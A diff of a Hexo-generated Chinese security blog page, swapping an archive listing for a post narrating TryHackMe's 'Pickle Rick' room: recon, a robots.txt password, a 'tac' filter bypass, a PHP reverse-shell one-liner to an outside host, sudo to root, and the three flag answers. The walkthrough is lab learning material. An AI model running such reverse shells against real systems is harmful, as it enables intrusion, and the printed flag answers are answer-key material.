@@ -5,7 +5,7 @@
 <head>
   
   <meta name="baidu-site-verification" content="code-J1Qg17G6wT" />
-  <title>文章归档：2023/10 - pr1nt&#39;s_blog</title>
+  <title>分类：Try Hack Me - pr1nt&#39;s_blog</title>
   <meta charset="UTF-8">
   <meta name="description" content="">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -18,7 +18,7 @@
   <link rel="shortcut icon" href="/images/head/oni.png" type="image/png" />
   <meta property="og:type" content="website">
 <meta property="og:title" content="pr1nt&#39;s_blog">
-<meta property="og:url" content="https://w0r1d-pr1nt.github.io/archives/2023/10/index.html">
+<meta property="og:url" content="https://w0r1d-pr1nt.github.io/categories/Try-Hack-Me/index.html">
 <meta property="og:site_name" content="pr1nt&#39;s_blog">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="pr1nt">
@@ -31,7 +31,7 @@
   
     <link rel="stylesheet" href="//at.alicdn.com/t/font_2421060_8z08qcz5sq3.css">
   
-  <link rel="stylesheet" href="/css/style.css?v=1708313380309">
+  <link rel="stylesheet" href="/css/style.css?v=1708313380320">
 <meta name="generator" content="Hexo 6.3.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -233,15 +233,15 @@
     <!-- 每篇文章的容器 -->
     <div class="nexmoe-post">
         <!-- 文章链接 -->
-        <a href="/2023/10/26/rce/">
+        <a href="/2024/02/19/thm/">
             <!-- 如果文章有自定义封面图 -->
             
                 <!-- 显示封面图容器，高度根据封面图宽高比动态计算 -->
-                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 56.25%;">
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;">
                     <!-- 封面图 -->
-                    <img data-src="/images/post/2.jpg" data-sizes="auto" alt="RCE全解" class="lazyload">
+                    <img data-src="/images/post/1.jpg" data-sizes="auto" alt="THM 两个简单靶场记录" class="lazyload">
                     <!-- 文章标题 -->
-                    <h1>RCE全解</h1>
+                    <h1>THM 两个简单靶场记录</h1>
                 </div>
             
         </a>
@@ -249,67 +249,50 @@
         
             <!-- 文章元信息，如发布日期、字数、阅读时间 -->
             <div class="nexmoe-post-meta nexmoe-rainbow">
-                <a><i class="nexmoefont icon-calendar-fill"></i>2023年10月26日</a>
-                <a><i class="nexmoefont icon-areachart"></i>630 字</a>
-                <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
+                <a><i class="nexmoefont icon-calendar-fill"></i>2024年02月19日</a>
+                <a><i class="nexmoefont icon-areachart"></i>373 字</a>
+                <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
             </div>
         
         <!-- 文章内容，显示摘要或全文 -->
         <article>
             <!-- 如果有摘要 -->
             
-                <!-- 显示摘要 -->
+                <!-- 否则显示全文 -->
                 <p>[TOC]</p>
 <ol>
-<li><a href="#%E4%B8%80rce%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">一、RCE漏洞概述</a></li>
-<li><a href="#%E4%BA%8C%E5%B8%B8%E8%A7%81rce%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0">二、常见RCE漏洞函数</a><ol>
-<li><a href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0">系统命令执行函数</a></li>
-<li><a href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0">代码执行函数</a></li>
+<li><a href="#pickle-rick">Pickle Rick</a><ol>
+<li><a href="#flag1">flag1</a></li>
+<li><a href="#flag2">flag2</a></li>
+<li><a href="#flag3">flag3</a></li>
 </ol>
 </li>
-<li><a href="#%E4%B8%89%E7%BB%95%E8%BF%87">三.绕过</a><ol>
-<li><a href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4">空格过滤:</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4">函数过滤:</a></li>
-<li><a href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">黑名单绕过:</a></li>
+<li><a href="#cyborg">Cyborg</a></li>
 </ol>
-</li>
-</ol>
-            
-        </article>
-    </div>
-    
-    <!-- 每篇文章的容器 -->
-    <div class="nexmoe-post">
-        <!-- 文章链接 -->
-        <a href="/2023/10/23/learn/">
-            <!-- 如果文章有自定义封面图 -->
-            
-                <!-- 显示封面图容器，高度根据封面图宽高比动态计算 -->
-                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 54.58333333333333%;">
-                    <!-- 封面图 -->
-                    <img data-src="/images/post/theworld.jpg" data-sizes="auto" alt="学习方法" class="lazyload">
-                    <!-- 文章标题 -->
-                    <h1>学习方法</h1>
-                </div>
-            
-        </a>
-        <!-- 如果文章被置顶 -->
-        
-            <!-- 文章元信息，如发布日期、字数、阅读时间 -->
-            <div class="nexmoe-post-meta nexmoe-rainbow">
-                <a><i class="nexmoefont icon-calendar-fill"></i>2023年10月23日</a>
-                <a><i class="nexmoefont icon-areachart"></i>1k 字</a>
-                <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
-            </div>
-        
-        <!-- 文章内容，显示摘要或全文 -->
-        <article>
-            <!-- 如果有摘要 -->
-            
-                <!-- 显示摘要 -->
-                <h1 id="学习方法摘录"><a href="#学习方法摘录" class="headerlink" title="学习方法摘录"></a>学习方法摘录</h1><blockquote>
-<p>摘自魏书生先生著作《好学生，好学法》并基于本人自身理解进行部分修改,与原著并不完全相同.（感谢闻校借我这本书让我能了解这些）</p>
+<blockquote>
+<p>记录下try hack me的学习之路</p>
 </blockquote>
+<h1 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h1><p><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle1.png" alt="题目" class="lazyload">  </p>
+<p>需要寻找三部分flag</p>
+<hr>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>首先打开题目,什么也没有,按F12看到用户名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle2.png" alt="1" class="lazyload">  </p>
+<p>然后信息收集:</p>
+<ol>
+<li>nmap扫描发现只开了两个端口:22,80</li>
+<li>dirsearch扫描发现可疑文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle3.png" alt="2" class="lazyload"></li>
+</ol>
+<p>访问robots.txt 看到一串字符串: <strong>Wubbalubbadubdub</strong>，猜测是密码<br>访问login.php 使用用户名和密码登录<br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle4.png" alt="3" class="lazyload">  </p>
+<p>是一个命令执行窗口，输入<strong>ls</strong>看看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle5.png" alt="4" class="lazyload">  </p>
+<p><strong>cat</strong>一下第一个txt文件发现被过滤，使用经典的绕过：<strong>tac</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle6.png" alt="5" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle7.png" alt="6" class="lazyload"><br>得到第一个flag：<strong>mr. meeseek hair</strong>  </p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>接着tac其他文件发现并无关键信息<br>clue.txt 内容：<strong>Look around the file system for the other ingredient.</strong><br>defined.php为：<img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickle8.png" alt="7" class="lazyload"><br>显然，权限不够<br>于是思考反弹shell到攻击机，使用php语言<br><code>php -r &#39;$sock=fsockopen(&quot;10.8.39.215&quot;,9999);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickleshell.png" alt="shell" class="lazyload"><br>反弹成功，并发现可以直接使用sudo su 变成root权限<br>然后就是随心所欲了，cd &#x2F;home发现rick，进一步拿到第二个flag: <strong>1 jerry tear</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickleshell2.png" alt="shell2" class="lazyload">  </p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>根据直接提权到root猜测最后一个flag在root目录下（让我们一开始不是root的时候访问不了）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/images/zhaopian/pickleshell3.png" alt="shell3" class="lazyload"><br>拿到最后一个flag：<strong>fleeb juice</strong></p>
+<pre><code>总结：这个还是很好玩的，体会到一步步寻找的乐趣，而且也非常简单，适合初学者熟悉大致流程。
+</code></pre>
+<hr>
+<h1 id="Cyborg"><a href="#Cyborg" class="headerlink" title="Cyborg"></a>Cyborg</h1><blockquote>
+<p>写不动了，打一把LOL再回来写</p>
+</blockquote>
+
             
         </article>
     </div>
@@ -1030,7 +1013,7 @@
 <script src="/lib/fancybox/js/jquery.fancybox.min.js"></script>
 
 
-<script src="/js/app.js?v=1708313380310"></script>
+<script src="/js/app.js?v=1708313380321"></script>
 
 <script src="https://lib.baomitu.com/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
 <script>
